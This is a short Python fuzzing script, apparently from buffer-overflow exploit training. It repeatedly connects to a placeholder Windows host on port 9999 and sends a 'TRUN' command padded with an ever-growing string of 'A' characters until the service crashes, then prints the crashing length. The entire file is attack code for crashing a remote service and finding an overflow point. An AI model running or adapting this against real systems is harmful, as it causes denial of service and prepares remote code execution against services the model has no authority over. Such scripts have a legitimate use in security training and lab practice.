#!/usr/bin/python
import socket
import sys
from time import sleep

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("WINDOWS_IP", 9999)) #CHANGE THIS 

        payload = "TRUN /.:/" + buffer + "\r\n"
        s.send(payload.encode())

        s.close()
        sleep(1)
        buffer += "A" * 100

    except:
        print("Fuzzing crashed at {} bytes".format(len(buffer)))
        sys.exit()
